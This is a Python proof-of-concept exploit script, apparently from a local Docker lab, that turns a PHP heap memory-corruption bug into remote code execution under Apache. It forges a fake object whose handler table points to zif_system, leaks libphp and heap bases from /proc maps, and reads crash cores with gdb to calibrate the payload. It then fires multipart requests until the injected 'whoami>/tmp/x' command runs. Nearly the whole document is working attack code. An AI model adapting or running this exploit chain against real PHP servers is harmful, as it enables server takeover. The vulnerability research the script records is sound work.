#!/usr/bin/env python3
"""oom74: v6 rotation-proof aiming.

Law (measured oom73 core): walk window lands at rotation r inside the
value tile; r varies per boot (200B tile breaks 16-alignment -> r = 8t
mod 16 drifts). Fix: 176B tile (11*16) -> all copies 16-aligned -> the
window is always T[phi:phi+8] for ONE boot-constant phi in 0..15.

Step 1: fire unrotated tile -> crash core -> decode phi (rdi bytes match
        T[phi:phi+8]).
Step 2: rebuild tile rotated by -phi so the window reads P exactly ->
        decrement hits rc=1 at P -> 0 -> rc_dtor_func -> store_del ->
        free_obj=zif_system(P) -> argz@P+80 -> gs@P+104 "whoami>/tmp/x".
Tile (176B, all offsets = P-relative, P = VA0+8):
  P+0   window ptr = P      P+8  rc=1      P+12 type_info=0x108
  P+16 handle=1             P+20 pad=0      P+24 ce=0
  P+32 handlers=VA0+136     P+40 This=0     P+48 u1=0, num_args=1(+52)
  P+56 prev=0               P+64 sym=0      P+72 req=0 pad=0
  P+80 argz{VA0+104, 6, 0}  P+96 pad
  P+104 gs{rc=1,type=0x106,h=0,len=12}      P+120 "whoami>/tmp/x\\0" pad->136
  P+136 table{0, &zif_system, 0, 0}        (168B used, pad ->176)
"""
import subprocess, sys, time, struct, re

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
AT_OFF = 0x1718


def sh(c, t=90):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def measure_bases():
    pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
    maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
    base = heap = None
    for ln in maps.splitlines():
        rng = ln.split()[0]
        a, b = [int(x, 16) for x in rng.split("-")]
        perms = ln.split()[1]
        if base is None and "libphp.so" in ln and perms.startswith("r"):
            base = a
        if "libphp.so" not in ln and "/dev/zero" not in ln and "[" not in ln \
                and (b - a) >= 0x200000 and perms.startswith("rw"):
            if heap is None:
                heap = a
    return base, heap


def build_tile(libphp_base, VA0, rot=0):
    Pp = VA0 + 8
    T = bytearray(176)
    struct.pack_into("<Q", T, 0, Pp)                  # window ptr (P+0)
    struct.pack_into("<IIII", T, 8, 1, 0x108, 1, 0)   # rc ti handle pad
    struct.pack_into("<Q", T, 24, 0)                  # ce
    struct.pack_into("<Q", T, 32, VA0 + 136)          # handlers (P+32)
    struct.pack_into("<QQ", T, 40, 0, 0)              # This.value, u1+..(num_args @P+44)
    struct.pack_into("<I", T, 44 + 8 - 8, 1)          # placeholder (fixed below)
    T[40:56] = struct.pack("<QQ", 0, 1 << 44 - 32)    # NOT this; set explicitly below
    T[40:56] = b"\x00" * 16
    struct.pack_into("<I", T, 52, 1)                  # num_args (P+44 -> T[52])
    struct.pack_into("<QQ", T, 56, 0, 0)              # prev, sym (P+56/64)
    struct.pack_into("<QQ", T, 72, 0, 0)              # req, pad (P+72/80?) -> careful
    T[72:88] = b"\x00" * 16
    struct.pack_into("<QII", T, 80, VA0 + 104, 6, 0)  # argz (P+80): value,type,u2
    struct.pack_into("<IIQI", T, 104, 1, 0x106, 0, len(CMD))  # gs (P+104)
    T[120:120 + len(CMD)] = CMD
    T[120 + len(CMD)] = 0
    struct.pack_into("<QQQQ", T, 136, 0, libphp_base + ZIF_SYSTEM, 0, 0)
    if rot:
        T = T[-rot:] + T[:-rot]
    return bytes(T)


def decode_phase(tile_plain, rdi_bytes):
    t2 = tile_plain + tile_plain
    for phi in range(176):
        if t2[phi:phi + 8] == rdi_bytes:
            return phi
    return None


print("[0] boot + core env", flush=True)
boot_core_env()
base, heap = measure_bases()
VA0 = heap + AT_OFF
print("  libphp=0x%x heap=0x%x VA0=0x%x" % (base, heap, VA0), flush=True)
T_plain = build_tile(base, VA0, rot=0)

print("[1] warm + sacrifice + fire1 (unrotated) — expect calibration crash", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=T_plain))
code, resp = post(P.build_attack(3400, 9200000, value_tile=T_plain))
print("  fire0: %s %r" % (code, resp[:60]), flush=True)

phi = None
if code != "200":
    time.sleep(3)
    sh("docker cp php_vuln:/tmp/core /tmp/c74 && docker cp /tmp/c74 phpbuild:/tmp/c74", 240)
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi\" /tmp/libphp.69.so /tmp/c74'", 240)
    m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    if m:
        rb = struct.pack("<Q", int(m.group(1), 16))
        phi = decode_phase(T_plain, rb)
        print("  crash rdi bytes=%s -> phi=%s" % (rb.hex(), phi), flush=True)
else:
    # SILENT fire: walk position j* ∈ {32, 80} (the only self-pointer fields
    # whose decrement lands on valid nonzero-after-dec memory). Try them.
    print("  fire0 silent — trying known silent-j rotations", flush=True)
    for jtry in (32, 80):
        T_try = bytes(T_plain[jtry:] + T_plain[:jtry]) if jtry else T_plain
        for fi in range(2):
            code, resp = post(P.build_attack(3400, 9210000 + fi * 100000,
                                             value_tile=T_try))
            print("  [j=%d] fire%d: %s %r" % (jtry, fi, code, resp[:60]), flush=True)
            time.sleep(2)
            chk = sh("docker exec php_vuln sh -c 'ls /tmp/x 2>&1'")
            if "No such" not in chk:
                print("*** RCE CONFIRMED (j=%d) ***" % jtry, flush=True)
                print("  /tmp/x: [%s]" % chk, flush=True)
                sys.exit(0)
            if code != "200":
                time.sleep(3)
                sh("docker cp php_vuln:/tmp/core /tmp/c74b && docker cp /tmp/c74b phpbuild:/tmp/c74b", 240)
                out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi\" /tmp/libphp.69.so /tmp/c74b'", 240)
                m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
                if m:
                    rb = struct.pack("<Q", int(m.group(1), 16))
                    phi = decode_phase(T_try, rb)
                    print("  crash rdi=%s -> phi=%s (tile rotated by %d -> plain-j=%d)"
                          % (rb.hex(), phi, jtry, (phi + jtry) % 176 if phi is not None else None), flush=True)
                break
        if phi is not None:
            break

if phi is None:
    print("  no phi — abort", flush=True)
    sys.exit(1)

# phi was measured in the coordinates of the tile LAST FIRED (T_plain in the
# crash path, T_try in the silent path). Either way the fix is the same:
# rotate plain by -phi so the window at offset phi reads T_plain[0:8] = P.
phi_plain = (176 - phi) % 176
print("[2] rebuild tile rotated by %d (window P check) and fire finishers" % phi_plain, flush=True)
T_rot = bytes(T_plain[phi_plain:] + T_plain[:phi_plain])
# sanity: window at phi must now read P
w = (T_rot + T_rot)[phi:phi + 8]
assert w == struct.pack("<Q", VA0 + 8), (w.hex(), struct.pack("<Q", VA0 + 8).hex())
for fi in range(4):
    code, resp = post(P.build_attack(3400, 9210000 + fi * 100000, value_tile=T_rot))
    print("  fire%d: %s %r" % (fi, code, resp[:80]), flush=True)
    time.sleep(2)
    chk = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    if "No such" not in chk:
        print("  /tmp/x: [%s]" % chk, flush=True)
        print("*** RCE CONFIRMED on fire %d ***" % fi, flush=True)
        break
    print("  /tmp/x: not yet", flush=True)

print("[3] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
